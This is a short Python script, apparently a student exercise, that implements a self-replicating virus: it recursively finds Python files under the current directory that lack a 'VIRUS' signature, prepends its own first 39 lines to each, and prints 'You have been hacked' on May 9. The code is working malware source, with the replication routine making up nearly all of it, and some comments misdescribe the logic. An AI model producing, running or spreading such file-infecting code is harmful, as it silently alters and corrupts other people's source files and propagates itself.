#!/usr/bin/python3
# Used GPT for syntax refrences

# Imports os module
import os
# Imports datetime module- used to modify dates and times
import datetime

# Assigns variable 
SIGNATURE = "VIRUS"

# Locates file path in directory
def locate(path):
    # Creates empty list for variable 'files_targeted'
    files_targeted = []
    # os.listdir(path) = Returns list of all files/ directories located in specified path
    filelist = os.listdir(path)
    # A for loop checks for 'fname' in 'filelist'
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
            # If the file named fname located at the directory path path is not a directory, this line checks if the file extension is .py
        elif fname[-3:] == ".py":
            # Sets infected value to false if filename is '.py.
            infected = False
            for line in open(path+"/"+fname):
                # Checks for variable "signature"
                if SIGNATURE in line:
                    infected = True
                    break
                # If var 'signature' is not found it is considered 'infected' 
                # Path of file added to 'files_targeted' 
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Defines new funtion to infect targeted files
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    # "virusstring". An empty string is simply a string with no characters in it. It can be useful as a starting point for building a string that will later be populated with information.
    virusstring = ""
    # Loop that checks if number is betweeen 0-38, if within range appends to "virusstring"
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # Infects python files named in 'files_targeted'
    for fname in files_targeted:
        # variable for function
        f = open(fname)
        temp = f.read()
        f.close()
        # Open/ write file
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# define new function
def detonate():
    # Checks if the date is May 9th 
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If date correct print "you have been hacked"
        print("You have been hacked")

 
# The os.path.abspath("") function call returns the absolute pathname of the current working directory.
# The abspath function in the os.path module takes a pathname as input and returns the absolute pathname of that file or directory.
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
